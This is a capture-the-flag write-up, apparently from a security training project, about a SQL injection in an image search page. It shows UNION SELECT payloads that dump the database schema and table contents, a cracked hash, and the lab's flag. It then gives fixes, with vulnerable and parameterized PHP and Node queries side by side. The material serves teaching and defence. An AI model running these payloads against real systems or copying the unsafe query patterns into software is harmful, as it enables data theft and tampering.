# Image Search Engine SQL injection

## How we found the breach

Before reading this breach explanation please have a look to this breach before:

[SQL injection on members table explanation →](../../sql_injection_members_table/Ressources/README.md)

The principle is the same as for the members SQL breach. As in the previous SQL injection we achieved to retrieve the whole database tables and columns. `list_images` table is not spared:

```sql
ID: 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: list_images
Surname : id
ID: 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: list_images
Surname : url
ID: 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: list_images
Surname : title
ID: 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: list_images
Surname : comment
```

`list_images` table has 4 columns:

- id
- url
- title
- comment

### UNION SELECT and CONCAT SQL injection

We will then retrieve all the table's entries with all their fields.

Input:
```sql
-1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images
```

Output:
```sql
ID: -1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images 
Title: 1https://fr.wikipedia.org/wiki/Programme_NsaAn image about the NSA !
Url : 1
ID: -1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images 
Title: 2https://fr.wikipedia.org/wiki/Fichier:4242 !There is a number..
Url : 1
ID: -1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images 
Title: 3https://fr.wikipedia.org/wiki/Logo_de_GoGoogleGoogle it !
Url : 1
ID: -1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images 
Title: 4https://en.wikipedia.org/wiki/Earth#/medEarthEarth!
Url : 1
ID: -1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images 
Title: 5borntosec.ddns.net/images.pngHack me ?If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : 1
```

We can see that the last image contains a hash to handle `1928e8083cf461a51303633093573c46`.

#### Retrieving the flag

Via md5 decrypt of `1928e8083cf461a51303633093573c46` string, contained in the `comment` column of `list_images` table, we get the original plain text: `albatroz`.

Hashing `albatroz` with sha256 algorithm gives us the flag: `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`.

## How to exploit the breach

Having a SQL injection breach can lead to leaking the whole database entries, involving users' personal information, emails, password, etc. 

But not only about stealing data, a hacker could even insert entries in a specific table, for example to add credits to his account. A hacker could even delete all the entries of a table – let's hope you made regular backups of your database.

## How to avoid this breach

A solution to avoid this kind of breach would be to escape received image id using either your native database escaping tools or manually.

An other solution would be to use an ORM that will natively prevent SQL injections.

You could also define restricted accesses to the connection to the database: restricted access to only a few tables, no deletion permission, no reading permission for critical tables, etc.

### PHP Example

Unsecured sql querying:

```php
$statement = $dbh->prepare("select comment, url from list_images where list_images.id = {$id}");
$statement->execute();
```

Secured sql querying:

```php
$statement = $dbh->prepare("select comment, url from list_images where list_images.id = ?");
$statement->execute([$id]);
```

### Node Example

Unsecured sql querying:

```js
connection.query(
  `select comment, url from list_images where list_images.id = ${id}`,
  function(err, rows, fields) {
    // Do something with the retrieved data.
  });

```

Secured sql querying:

```js
connection.query(
  'select comment, url from list_images where list_images.id = ?',
  [id],
  function(err, rows, fields) {
    // Do something with the retrieved data.
  });
```
